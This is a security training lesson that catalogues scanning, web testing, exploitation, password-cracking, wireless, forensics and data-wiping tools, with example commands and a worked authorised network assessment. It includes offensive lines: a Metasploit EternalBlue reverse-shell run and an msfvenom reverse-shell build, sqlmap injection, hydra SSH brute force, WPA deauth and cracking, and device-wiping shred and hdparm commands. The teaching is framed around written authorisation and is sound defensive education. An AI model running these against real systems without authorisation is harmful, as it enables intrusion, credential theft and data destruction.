# Security Tools — The Working Toolkit

Tools do not replace understanding. A junior who runs `nmap -A` against everything they touch is more dangerous than useful — to themselves, to the network, and to the people who eventually have to clean up the noise. The point of knowing tools is not to memorise flags; it is to recognise which tool belongs to which problem so that, when the problem appears in production at 02:00, the right utility is already in your hands and you can read what it tells you.

A working SOC/IT engineer carries roughly the same kit as a working car mechanic: a few things they reach for daily (`nmap`, `tcpdump`, `wireshark`, the OpenSSL command line), a second tier they pull out a few times a month (Nessus, hashcat, Burp, theHarvester), and a long tail of specialist gear they touch a couple of times a year but absolutely have to know exists (Volatility for memory forensics, KAPE for triage collection, hostapd-wpe for wireless captive portals). This lesson is the catalogue. The companion lesson on [Organizational Security Assessment](./security-assessment.md) is the process that drives when and why you reach for any of it.

Nothing in this document is a free pass to point any of these tools at someone else's network. Every section assumes you have written authorisation, a defined scope, and a way for blue-team to know it is you and not the actual attacker.

## Tool categories map

Almost every utility in this lesson falls into one of nine boxes. Knowing the box is more useful than knowing the tool — because if you understand "I need a packet analyser" you can swap Wireshark for tshark for tcpdump as the situation demands.

```mermaid
flowchart TB
    K[Security toolkit]
    K --> D[Discovery & scanning<br/>nmap, masscan, fping, arp-scan]
    K --> V[Vulnerability scanners<br/>Nessus, OpenVAS, Qualys, Rapid7]
    K --> W[Web app testing<br/>Burp, ZAP, sqlmap, gobuster, nikto]
    K --> E[Exploitation frameworks<br/>Metasploit, Cobalt Strike, Sliver]
    K --> P[Packet analysis<br/>Wireshark, tcpdump, tshark]
    K --> F[Forensics & IR<br/>Autopsy, Volatility, KAPE, Sysinternals]
    K --> C[Password & hash attacks<br/>hashcat, John, hydra, medusa]
    K --> O[OSINT<br/>theHarvester, SpiderFoot, Maltego, Shodan]
    K --> S[Data sanitization<br/>shred, sdelete, DBAN, NIST 800-88]
    K --> WL[Wireless<br/>aircrack-ng, Kismet, hostapd-wpe]
```



The two boxes that crop up in *every* engagement are **discovery** and **packet analysis** — discovery because you cannot test what you cannot see, and packet analysis because every weird finding eventually comes down to "what is actually on the wire." Build muscle memory in those two first; everything else slots in behind them.

## Network discovery and scanning

Discovery answers two questions: *what is alive* and *what is it running*. Without discovery, the rest of the kit has no targets.

### nmap

`nmap` is the standard. It has been the de-facto network mapper since 1999, runs on Windows / Linux / macOS, drives scans from the command line (and via the Zenmap GUI), and includes a Lua-based scripting engine (NSE) with hundreds of community-maintained scripts for everything from SMB enumeration to SSL vulnerability checks.

Ninety percent of real work uses one of four scan styles:

| Scan | Flag | When to use it |
|---|---|---|
| TCP connect | `-sT` | Unprivileged user, full TCP handshake, easy to log |
| SYN (half-open) | `-sS` | Default for root; faster, lighter footprint |
| UDP | `-sU` | Slow but mandatory for DNS/SNMP/NTP discovery |
| Version detection | `-sV` | "What service and version is on this port?" |

A handful of flags carry the bulk of the work:

```bash
# Top 1000 TCP ports, version detection + default NSE scripts, fast
nmap -sV -sC -T4 192.0.2.0/24

# Full TCP port range, SYN scan, OS fingerprint
sudo nmap -sS -p- -O -T4 192.0.2.10

# UDP top 100 (UDP scans are slow on purpose)
sudo nmap -sU --top-ports 100 -T4 192.0.2.10

# Targeted NSE script — check SMB for ms17-010
nmap -p 445 --script smb-vuln-ms17-010 192.0.2.10
```

The `-T0` … `-T5` knob controls timing. `-T3` is default, `-T4` is the sane working speed, `-T5` will trip every IDS in sight and lose accuracy. Use `-T2` on fragile networks (older ICS gear, satellite links, anything you do not own).

NSE scripts live under `/usr/share/nmap/scripts/`. Skim them once — there are scripts for HTTP enumeration, SSL/TLS posture (`ssl-enum-ciphers`), database fingerprinting, and a "vuln" category that flags known CVEs.

### masscan

`masscan` is what you reach for when nmap is too slow. It can scan the entire IPv4 internet for a single port in under ten minutes on a 10 Gbps link by sending raw packets without holding TCP state. Output is intentionally compatible with nmap's XML so you can hand off to nmap for service detection in a second pass.

```bash
# Scan a /16 for port 443 at 10k packets/sec
sudo masscan 198.51.100.0/16 -p443 --rate 10000 -oG masscan.gnmap

# Convert hits → nmap targets, then deep-scan
awk '/Host:/ {print $2}' masscan.gnmap | sudo nmap -sV -sC -iL -
```

Masscan is dumb on purpose. Use it to find live services across huge ranges; never use it as a substitute for nmap's analysis depth.

### fping and arp-scan

For host discovery on a known LAN, neither nmap nor masscan is the lightest tool.

```bash
# Sweep a /24 for live hosts via ICMP, only print alive ones
fping -a -g 192.168.1.0/24 2>/dev/null

# Layer-2 sweep — works even when ICMP is blocked
sudo arp-scan --localnet
sudo arp-scan -I eth0 192.168.1.0/24
```

`arp-scan` is usually the fastest way to inventory a switched LAN because ARP cannot be filtered without breaking the network itself. If a machine is on the wire, `arp-scan` will see it.

### Supporting commands

A discovery pass is rarely just one tool — these built-in utilities sit alongside nmap on every engagement:

| Command | What it tells you |
|---|---|
| `tracert` (Win) / `traceroute` (Linux/macOS) | Hop-by-hop path to a target; ICMP-blocked routers go silent |
| `pathping` (Win) | tracert + per-hop loss statistics, slower but richer |
| `nslookup` (Win) / `dig` (Linux) | DNS lookups; `dig` returns parseable output for scripts |
| `ipconfig` (Win) / `ifconfig` or `ip` (Linux) | Local interfaces, MAC, IP, gateway, DHCP, DNS |
| `arp -a` | Local ARP cache (which MACs you have spoken to recently) |
| `route` | Current routing table; can also modify routes |
| `netstat -an` / `ss -tunlp` | Live TCP/UDP connections and listening sockets |
| `netcat` (`nc`) | Raw TCP/UDP transmitter, receiver, port scanner, file copier |
| `hping3` | Crafts arbitrary TCP/UDP/ICMP packets for testing firewalls and IDS |
| `curl` | HTTP(S) and 20-odd other protocols; single most useful one-liner tool |
| `dnsenum` | DNS subdomain enumeration plus zone-transfer attempts |

Two niche-but-known tools worth flagging:

- **`scanless`** — calls out to public port-scan websites so the source IP of the scan is not yours. Anonymises but cannot replace a real scan.
- **`sn1per`** — Linux automation that chains nmap, Metasploit modules, brute-force, and DNS enumeration. Useful for triage; loud as a foghorn.

## Vulnerability scanners

A discovery scan tells you *what is there*. A vulnerability scan tells you *what is wrong with it*. The big four in 2026:

| Scanner | Licence | Mode | Strengths | Weaknesses |
|---|---|---|---|---|
| **Nessus** (Tenable) | Commercial; free Essentials capped at 16 IPs | Network + agent | Largest plugin library, gold standard for compliance scans | Authenticated scans require Windows admin / Linux sudo |
| **OpenVAS / Greenbone CE** | Free / open source | Network | Good coverage, no per-IP pricing | Slower release of new CVE checks; UX rougher |
| **Qualys VMDR** | Commercial SaaS | Cloud + agent | Excellent dashboards, asset auto-discovery, SaaS hosted | Subscription, data leaves your perimeter |
| **Rapid7 InsightVM** | Commercial | Network + agent | Strong remediation workflow integration | Heavier console resources than Nessus |

Two design choices matter more than which vendor:

**Authenticated vs unauthenticated** — an unauthenticated scan only sees what is on the wire (banners, response codes). An authenticated scan logs into the system with credentials (Windows admin, SSH key, SNMP v3) and reads installed patches, registry, package versions. Authenticated scans find roughly **5–10×** more findings, with far fewer false positives. Always run authenticated where you can.

**Agent vs network** — a network scan reaches across the wire from a console; an agent runs locally on the asset and reports back. Agents win for laptops that are off the corporate network half the time and for sealed servers where the firewall blocks remote authentication. Network scans win for unmanaged devices (printers, switches, IoT) where you cannot install anything.

A typical /24 network scan with Nessus, fully authenticated, runs **2–6 hours** and produces 200–2,000 findings before triage. A masscan pre-pass to drop the dead hosts cuts that in half.

```bash
# Quick CLI sanity check that an OpenVAS scan task is alive
sudo gvm-cli --gmp-username admin --gmp-password 'pwd' \
  socket --socketpath /run/gvmd/gvmd.sock \
  --xml '<get_tasks/>'
```

Vulnerability scanners are not pentest replacements — they find *known* misconfigurations and *known* CVEs. Anything novel still needs a human.

## Packet analyzers

Sooner or later every weird finding becomes "what is actually on the wire." Three tools cover 99% of that work.

### Wireshark

The gold-standard GUI analyser. Dissects virtually every protocol, lets you follow streams, carve files out of HTTP/SMB transfers, and decrypt TLS when you have the session keys. The display-filter language is what makes it powerful — learn five filters and you have a working toolkit:

```text
ip.addr == 192.0.2.10
tcp.port == 443
http.request.method == "POST"
dns and ip.dst == 8.8.8.8
tcp.analysis.retransmission
```

Wireshark needs the traffic on its NIC. On a switched network that means SPAN/mirror ports on the switch, or a hardware TAP between the cable ends. A laptop plugged into a normal access port sees only its own conversations and broadcasts — never assume otherwise.

### tcpdump

The CLI workhorse. Use it on remote servers where Wireshark cannot run, in scripts, and for unattended captures.

```bash
# Capture DNS queries on eth0 to a rolling file, 100 MB per file, keep 5
sudo tcpdump -i eth0 'udp port 53' -w dns-%Y%m%d-%H%M.pcap \
  -C 100 -W 5 -G 3600

# Live capture, no DNS resolution (faster), show packet contents
sudo tcpdump -i eth0 -nn -A 'tcp port 80'

# Read a file and filter further
tcpdump -r incident.pcap 'host 192.0.2.10 and tcp port 22'
```

A realistic task: *capture 30 seconds of DNS on eth0 and open in Wireshark*.

```bash
sudo timeout 30 tcpdump -i eth0 -w /tmp/dns.pcap 'port 53'
# Then on your workstation
scp server:/tmp/dns.pcap .
wireshark dns.pcap
```

### tshark

Wireshark's CLI cousin — same dissectors, scriptable output. Useful for one-off extractions inside pipelines.

```bash
# Pull every HTTP host header from a pcap
tshark -r capture.pcap -Y http.request -T fields -e http.host | sort -u

# Live capture of TLS SNI for one minute
sudo tshark -i eth0 -a duration:60 -Y 'tls.handshake.extensions_server_name' \
  -T fields -e tls.handshake.extensions_server_name
```

### tcpreplay

Companion utility — replays a pcap file back onto the wire. Used for testing IDS rules, validating SIEM detections without waiting for an attacker, and load-testing inline tooling.

```bash
sudo tcpreplay -i eth0 --topspeed attack-sample.pcap
```

## Web application testing

Web testing is its own sub-discipline. The toolkit:

- **Burp Suite** (PortSwigger) — the de-facto web proxy. Community is free with crippled scanner; **Pro** (~$475/yr) adds active scanning and the Intruder fuzzer at full speed. Almost every commercial web pentest is delivered via Burp.
- **OWASP ZAP** — free, open source, similar feature set to Burp Community plus active scanning. The right answer when budget is zero.
- **sqlmap** — automates SQL injection. Detects, extracts, and dumps databases through dozens of payload variants.
- **dirb / gobuster / ffuf** — directory and file brute-forcers. `gobuster` is the modern fast one; `ffuf` adds HTTP-fuzzing flexibility.
- **nikto** — quick vulnerability scanner aimed at web servers; loud, useful as a first sweep.

A working "first 30 minutes on a web app" sequence:

```bash
# 1. What is it really running?
nmap -sV -p 80,443 -sC --script=http-headers,http-title,ssl-cert app.example.local

# 2. Crawl visible content directory structure
gobuster dir -u https://app.example.local \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 20 -o gobuster.out

# 3. Quick known-vuln sweep
nikto -h https://app.example.local -o nikto.html -Format html

# 4. Manual exploration in Burp — set browser proxy to 127.0.0.1:8080,
#    spider, then walk every form field through Repeater + Intruder

# 5. Test obvious injection on parameter id
sqlmap -u "https://app.example.local/item?id=1" --batch --risk=2 --level=3
```

That sequence is not a pentest — it is "did anyone leave the front door open." A real web assessment continues from there into authentication, session handling, business-logic abuse, and so on (see OWASP WSTG).

## Exploitation frameworks

Exploitation frameworks bundle the multiple steps an exploit usually takes — stager, payload, post-exploitation, persistence — into a consistent CLI.

### Metasploit (msfconsole)

The free, open-source workhorse. Runs on Linux (default in Kali), comes pre-loaded with thousands of exploit, auxiliary, and post-exploitation modules.

```text
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > info
msf6 exploit(...) > set RHOSTS 192.0.2.10
msf6 exploit(...) > set LHOST 192.0.2.5
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > run
```

The five concept boxes you must hold in your head:

| Concept | What it is |
|---|---|
| **Exploit** | The vulnerability-specific code that triggers code execution |
| **Payload** | What runs after the exploit succeeds (Meterpreter, shell, beacon) |
| **Auxiliary** | Non-exploit helpers — scanners, brute-forcers, fuzzers |
| **Post** | Modules you run *after* you have a session — credential dump, lateral movement |
| **Encoder** | Wraps the payload to evade simple AV signatures |

`msfvenom` is the standalone payload generator:

```bash
# Generate a Windows reverse-shell binary
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.0.2.5 LPORT=4444 -f exe -o reverse.exe
```

### Cobalt Strike, Sliver, Covenant

Brief mentions for awareness — defenders need to recognise their footprints:

- **Cobalt Strike** — commercial ($3,500/yr/user) red-team C2 framework, the industry standard for adversary simulation and, unfortunately, the most-abused leaked tool in real ransomware operations.
- **Sliver** — open source C2 from Bishop Fox, written in Go, increasingly seen replacing Cobalt Strike in real engagements (and in real attacks).
- **Covenant** — .NET-based C2, useful for Windows-heavy environments where PowerShell/.NET tradecraft fits.

A defender does not need to operate these. You do need to recognise their default beacon profiles, named pipe patterns, and process-injection telemetry — IR teams hunt for them constantly.

## Password and hash attacks

Two reasons a defender owns a cracker: to test the strength of their own users' passwords (with permission), and to crack hashes recovered during an incident to understand blast radius.

| Tool | Best at |
|---|---|
| **hashcat** | GPU-accelerated offline cracking; the fastest cracker that exists |
| **John the Ripper** | CPU cracking, exotic hash formats, "jumbo" community version |
| **hydra** | Online network protocol brute-force (SSH, RDP, FTP, HTTP forms) |
| **medusa** | Older online brute-forcer, comparable to hydra |
| **CeWL** | Wordlist generator that scrapes a target website for vocabulary |

A demo: crack the NTLM hash of `Password1` with rockyou.

```bash
# NTLM(Password1) = 64f12cddaa88057e06a81b54e73b949b
echo "64f12cddaa88057e06a81b54e73b949b" > hash.txt

# Mode 1000 = NTLM; -a 0 = wordlist attack
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# View results
hashcat -m 1000 hash.txt --show
```

On a single mid-range GPU NTLM cracks at roughly 60 GH/s; the entire rockyou list (14 M entries) finishes in under a second. That is what makes "Password1" a non-password.

For online targets, hydra against an SSH server with a small list:

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
  -t 4 -o hydra.out ssh://192.0.2.10
```

Always check rate-limit and lockout before running anything online. A noisy hydra burst will lock every account on the target.

## OSINT tools

OSINT (Open Source Intelligence) is reconnaissance from public sources only — no probes against the target. Useful for scoping, for knowing what an attacker can already see about you, and for blue-team threat-intel work.

| Tool | Sources |
|---|---|
| **theHarvester** | Search engines, PGP keyservers, Shodan, certificate logs — pulls e-mails, hosts, employees |
| **SpiderFoot** | Automation framework that chains 200+ OSINT modules |
| **Maltego** | Graph-based investigation — nodes for people, domains, IPs; transforms pull data |
| **Recon-ng** | Modular CLI framework, similar feel to Metasploit but for OSINT |
| **Shodan** | Search engine of internet-exposed services and banners |
| **Censys** | Like Shodan, deeper TLS / certificate dataset |
| **whois** | Domain registration info — owner, registrar, dates |
| **dig** | DNS queries — A, MX, NS, TXT, AXFR |
| **crt.sh** | Free Certificate Transparency log search; reveals subdomains via issued certs |

A 5-minute external footprint pass on `example.local`:

```bash
# Domain registration
whois example.local

# DNS surface
dig +short example.local A
dig +short example.local MX
dig +short example.local TXT

# Subdomains via CT logs
curl -s 'https://crt.sh/?q=%25.example.local&output=json' \
  | jq -r '.[].name_value' | sort -u

# Emails, hostnames, employees
theHarvester -d example.local -b all -l 500

# Internet-exposed services
# (in a browser at https://www.shodan.io/search?query=hostname%3Aexample.local)
```

Everything above is passive against the target. None of it touches their infrastructure — all data is pulled from third parties.

## Wireless assessment

Wireless work needs a USB adapter that supports monitor mode and packet injection (the Alfa AWUS036 family is the perennial choice).

- **aircrack-ng suite** — the classic tool family. `airmon-ng` (puts the card into monitor mode), `airodump-ng` (captures), `aireplay-ng` (deauths), `aircrack-ng` (cracks WEP/WPA handshakes).
- **Kismet** — passive wireless detector and sniffer; great for site surveys and rogue-AP hunting.
- **hostapd-wpe** — runs a fake AP to harvest credentials from clients that auto-connect to enterprise WPA SSIDs (the "evil twin" attack).
- **WiFi Pineapple** (Hak5) — hardware appliance that automates the rogue-AP and man-in-the-middle workflow; convenient for client-side wireless testing.

Capture a WPA2 handshake for offline cracking:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon                       # find target BSSID + channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w handshake wlan0mon
# In another terminal — deauth a connected client to force re-handshake
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# Crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
```

## Forensics and IR tools

When something has already gone wrong, you need to collect, preserve, and analyse — without modifying what is in front of you.

### Collection

| Tool | Purpose | OS |
|---|---|---|
| **FTK Imager** | Bit-for-bit forensic disk imaging with hash verification; free | Win, Linux |
| **`dd`** | Linux native imaging; same idea, no GUI | Linux |
| **memdump** | Linux memory acquisition (`/dev/mem`) | Linux |
| **WinPMEM / DumpIt** | Windows memory acquisition | Win |
| **KAPE** | Live triage collector; runs on a live Windows host and grabs only the artefacts you need | Win |
| **Velociraptor** | Agent-based remote DFIR collection at fleet scale | Win, Linux, macOS |

A field principle: image first, analyse the image. Never analyse the live disk if you have the option to make a copy.

```bash
# Image a USB stick to a file with hash verification
sudo dd if=/dev/sdb of=usb.img bs=4M status=progress
sha256sum usb.img > usb.img.sha256
```

### Analysis

| Tool | Purpose |
|---|---|
| **Autopsy** | Open-source GUI forensic suite (built on The Sleuth Kit). File-system analysis, timeline, keyword search, EXIF, deleted-file carving |
| **Volatility 3** | Memory forensics — process list, network connections, injected code, registry hives, malware indicators from a memory image |
| **WinHex / X-Ways** | Commercial hex editor + full forensic suite, popular in law enforcement |
| **Sysinternals** | Microsoft's free Windows toolkit — Process Explorer, Autoruns, Procmon, TCPView, Sigcheck, Strings |
| **Cuckoo Sandbox** | Open-source malware sandbox — runs a sample in an isolated VM and reports network/system calls |

A typical Volatility session against a memory image:

```bash
# What process tree was running?
vol -f mem.raw windows.pstree

# Network connections at capture time
vol -f mem.raw windows.netscan

# Suspicious code injection
vol -f mem.raw windows.malfind
```

### Sysinternals quick wins

For Windows triage with no full IR kit installed:

| Tool | What it shows |
|---|---|
| **Process Explorer** | Process tree with full path, signing, parent/child, loaded DLLs, network |
| **Autoruns** | Every persistence location on the system — services, RunKeys, scheduled tasks, drivers |
| **Procmon** | Real-time file/registry/process/network activity — the firehose |
| **TCPView** | Live socket → process map |
| **Sigcheck** | Verifies binary signatures and queries VirusTotal hashes |
| **Strings** | Pulls printable strings out of binaries, useful for quick triage |

## Data sanitization and secure disposal

Data sanitization is the discipline of making sure that retired media cannot leak the data that used to live on it. The standard reference is **NIST SP 800-88 Rev. 1**, which defines three escalating tiers:

| Tier | Method | Recovery resistant to | Use when |
|---|---|---|---|
| **Clear** | Software overwrite (single pass on modern drives is sufficient) | Standard recovery tools | Drive will be reused inside the organisation |
| **Purge** | Cryptographic erase, ATA Secure Erase, degausser (magnetic media only) | Lab-grade recovery | Drive leaves the organisation but media is reused |
| **Destroy** | Physical destruction — shred, incinerate, disintegrate, pulverise | Anything | Highly sensitive data; SSDs that cannot be reliably purged; legal disposal mandate |

Tools by platform:

```bash
# Linux — overwrite a single file with random + zero passes
shred -v -n 3 -z /var/log/secret.log

# Linux — wipe a whole device (use with extreme care, no undo)
sudo shred -v -n 1 /dev/sdb
# Or modern alternative: ATA Secure Erase via hdparm
sudo hdparm --user-master u --security-set-pass p /dev/sdb
sudo hdparm --user-master u --security-erase p /dev/sdb
```

```powershell
# Windows — Sysinternals sdelete, single-pass overwrite of free space
sdelete -p 1 -s -z C:\

# Windows — overwrite a specific file 3 passes
sdelete -p 3 secret.docx
```

Bootable wipers like **DBAN** (Darik's Boot and Nuke) are deprecated for SSDs because flash translation layers can leave shadow blocks untouched. For SSDs use the manufacturer's secure-erase utility, full-disk encryption with key destruction (cryptographic erase), or physical destruction.

**When destruction is legally required:**

- Healthcare data (HIPAA in the US, equivalent national PHI rules elsewhere) often mandates destruction of media beyond simple wiping.
- Payment card data (PCI-DSS Requirement 9.8) requires that media containing cardholder data is destroyed when no longer needed for business or legal reasons.
- Government classified material has its own destruction standards (NSA/CSS Policy 9-12 in the US).
- Many organisations contract a certified shredding service for HDDs and an e-waste partner for SSDs/phones, with a chain-of-custody certificate for each batch.

A degausser destroys magnetic media by exposing it to a strong magnetic field. It does **not** work on SSDs (no magnetic substrate) — for SSDs the only guarantee is physical destruction.

## Distributions

Several Linux distros ship pre-loaded with the toolkit so you do not spend a day installing 200 packages.

| Distro | Strength | Where it fits |
|---|---|---|
| **Kali Linux** | Pen-test default; ~600 tools pre-installed; rolling release | Daily-driver attack distro |
| **Parrot OS** | Lighter than Kali; security + privacy + dev workstation in one | Alternative to Kali for daily use |
| **BlackArch** | Arch-based with 2,800+ tools; very large repository | Specialist work needing exotic tools |
| **Pentoo** | Gentoo-based pen-test distro; live CD/USB | Hardware-aware engagements |
| **Flare-VM** | Windows-based; reverse-engineering and malware analysis stack | Windows malware reversing |
| **SIFT Workstation** | Ubuntu-based DFIR distro from SANS | Forensic case work |
| **REMnux** | Linux-based malware reverse-engineering distro | Static and dynamic malware analysis |

Most engineers run a Kali (or Parrot) VM for offence and a SIFT or REMnux VM for defence/analysis, snapshotted so each engagement starts clean.

## Hands-on

Four exercises to drive the toolkit into muscle memory. Do them in a VM that you own.

### 1. Install Kali in a VM, run a basic nmap

Download Kali from `https://www.kali.org/get-kali/` (the VM image, not the live ISO), import it into VirtualBox or VMware, log in (`kali`/`kali`), and run:

```bash
nmap -sV -sC -T4 -p- scanme.nmap.org
```

`scanme.nmap.org` is an authorised target Nmap maintains for exactly this purpose. Read the output: Which ports are open? What versions? What did the default NSE scripts find? Identify at least one finding you would investigate further if this were a real engagement.

### 2. Capture 30 seconds of your own DNS traffic

Inside the Kali VM, find your active interface (`ip a`), then:

```bash
sudo timeout 30 tcpdump -i eth0 -w dns.pcap 'port 53'
```

Generate some DNS while it runs (open a browser, hit five sites). Open the file in Wireshark (`wireshark dns.pcap`), apply the filter `dns`, and answer:

- Which queries went out? Which were answered?
- Was DNS in plain UDP/53 or DoH/DoT?
- How long was the slowest response?

### 3. Load Metasploit, look up MS17-010

```bash
msfconsole -q
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > info
```

Read the entire `info` page. Identify the required options (`RHOSTS`, `LHOST`, `PAYLOAD`), the affected platforms, the disclosure date, and the references. You are not running it — you are learning to read a module page.

### 4. Crack a sample MD5 hash with hashcat

The MD5 of `Password1` is `2ac9cb7dc02b3c0083eb70898e549b63`. Save it:

```bash
echo "2ac9cb7dc02b3c0083eb70898e549b63" > sample.hash
hashcat -m 0 -a 0 sample.hash /usr/share/wordlists/rockyou.txt
hashcat -m 0 sample.hash --show
```

Note the hashes-per-second rate. Then try the same hash with `hashcat -m 0 -a 3 sample.hash ?u?l?l?l?l?l?l?d` (an 8-char mixed mask) and compare runtime. The lesson is how dramatically wordlist beats brute-force when the password is in the list.

## Worked example — example.local weekend scan

You are the IT security engineer at example.local — a 200-employee software firm. Friday afternoon you receive written authorisation from the CTO to perform a network-wide assessment of the office subnet `10.10.0.0/24` over the weekend. The blue-team SIEM analyst is on call and knows your scan window. Below is the cadence a working engineer follows.

**Friday 18:00 — Discovery (~15 min).** From your testing laptop on the office VLAN:

```bash
sudo arp-scan -I eth0 10.10.0.0/24 | tee discovery.txt
sudo nmap -sn 10.10.0.0/24 -oG nmap-alive.gnmap
```

Cross-reference the two outputs. The `arp-scan` line catches devices that ICMP-block. You should end up with ~150 alive hosts (workstations sleeping at home count themselves out).

**Friday 19:00 — Service enumeration (~2 hours).** Feed the alive list into a deeper scan:

```bash
awk '/Up/ {print $2}' nmap-alive.gnmap > alive.txt
sudo nmap -sV -sC -T4 -p- -iL alive.txt -oA full-scan
```

When this completes you have an XML, grep, and human-readable record of every open port and service version on the subnet. Sort findings by anomaly: a printer with port 22 open, an unmanaged Linux server on the desktop VLAN, an old Windows 7 machine the auditor missed in last quarter's inventory.

**Saturday 09:00 — Authenticated vulnerability scan (~4 hours).** Launch Nessus (or OpenVAS) against the same target list, this time with the *Domain Admins* read-only account the IT manager provisioned. Authenticated scans are slow — start it before coffee. Triage the report into Critical / High / Medium / Low using CVSS plus business context (see [Organizational Security Assessment](./security-assessment.md) for the rating method).

**Saturday 14:00 — Investigate one anomaly with packet capture.** The Nessus report flags a workstation `10.10.0.87` making outbound connections to a country you do not do business in. Park a `tcpdump` on the office gateway:

```bash
sudo tcpdump -i eth0 -w susp.pcap 'host 10.10.0.87'
```

Wait an hour. Open in Wireshark, filter `ip.dst == <suspicious-IP>`, follow the TCP stream. It turns out to be a developer's IDE plugin auto-updating from a CDN in that country — false alarm, but documented.

**Sunday 11:00 — Wrap-up.** Compile findings, screenshot the evidence, draft the report (template lives in the [security-assessment](./security-assessment.md) lesson), and notify the SIEM analyst the scan window is closed. Monday's standup gets the executive summary; the technical findings ticket goes to the platform team with SLAs by severity.

That sequence — discover, enumerate, scan, investigate the weird thing, document, hand off — is the same whether you are at example.local or at a Fortune 500. Only the scale and the tooling around the edges change.

## Legal and ethical guardrails

Unauthorised scanning is a crime in most jurisdictions (US Computer Fraud and Abuse Act, UK Computer Misuse Act, EU national equivalents under the Cybercrime Convention). Even authorised scanning can break things, generate alerts you do not want, and end careers when done sloppily. The non-negotiables:

- **Only scan what you are authorised to scan.** Written, dated, scoped — not "the IT manager said it was OK over coffee." If you cannot show the auth letter, do not scan.
- **Define scope precisely.** IP ranges, hostnames, time windows, allowed techniques (no DoS, no social engineering unless explicitly listed), exclusions (production payment processor, executive endpoints).
- **Control the blast radius.** Start with low timing (`-T2`/`-T3`), small concurrency, and known-safe scan profiles. Escalate only with permission.
- **Notify blue-team.** They should know who is running the test, when, from which IP, and how to reach you. Otherwise they treat it as a real attack — which is the point of internal drills, but should be deliberate.
- **Handle findings as confidential data.** A pen-test report is a roadmap to compromising the company. Encrypt it at rest, e-mail only via approved channels, store on the engagement platform not in a shared drive.
- **Stop when something breaks.** Note it, report it, do not "just continue and we will fix it later." A crashed cardiac-monitoring server because of an aggressive UDP scan is not a tooling problem; it is a people problem.
- **No vendor scanners against third-party SaaS without their consent.** Scanning Microsoft 365 or AWS endpoints without going through their pen-test programme is a contract violation.

If you are unsure whether a particular action is in scope, ask before doing it. Auditors and lawyers care more about the question being asked than about the technical purity of the answer.

## Key takeaways

- Tools are the easy part — knowing which tool fits which problem is the skill.
- Discovery (`nmap`, `arp-scan`, `masscan`) and packet analysis (`Wireshark`, `tcpdump`) are the two universal capabilities; build them first.
- Authenticated, agent-based vulnerability scanning finds dramatically more than network-only scans — set credentials up front.
- A web app first-pass is the same five steps every time: identify, crawl, sweep, manual proxy, targeted injection.
- Metasploit is the framework you must read fluently; the actual exploit is rarely the interesting part — the post-exploitation modules are.
- Crackers (`hashcat`, `John`) belong in the defender's kit too, for password-strength testing and incident triage.
- OSINT comes before scanning — find out what an attacker can already see, then plan around it.
- Forensic tools care most about *order*: image first, analyse the image; never trust the live system once you suspect compromise.
- NIST SP 800-88 (Clear / Purge / Destroy) is the disposal standard; SSDs need cryptographic erase or physical destruction, not DBAN.
- Authorisation, scope, and blast-radius control are not paperwork — they are what separates a security engineer from a criminal.

## References

- Nmap reference guide and NSE scripts — `https://nmap.org/book/man.html`
- Nessus / Tenable documentation — `https://docs.tenable.com/`
- OpenVAS / Greenbone Community Edition — `https://greenbone.github.io/docs/`
- PortSwigger Web Security Academy (free, world-class web testing curriculum) — `https://portswigger.net/web-security`
- OWASP Web Security Testing Guide (WSTG) — `https://owasp.org/www-project-web-security-testing-guide/`
- Metasploit Unleashed (free MSF course) — `https://www.offsec.com/metasploit-unleashed/`
- hashcat wiki — `https://hashcat.net/wiki/`
- Volatility 3 documentation — `https://volatility3.readthedocs.io/`
- Sysinternals utilities — `https://learn.microsoft.com/en-us/sysinternals/`
- Kali Linux tools index — `https://www.kali.org/tools/`
- NIST SP 800-88 Rev. 1 — Guidelines for Media Sanitization — `https://csrc.nist.gov/publications/detail/sp/800-88/rev-1/final`
- SANS GIAC tool reference (free white papers) — `https://www.sans.org/white-papers/`
- aircrack-ng documentation — `https://www.aircrack-ng.org/documentation.html`
- Shodan and Censys — `https://www.shodan.io/` , `https://censys.io/`
- Certificate Transparency search — `https://crt.sh/`
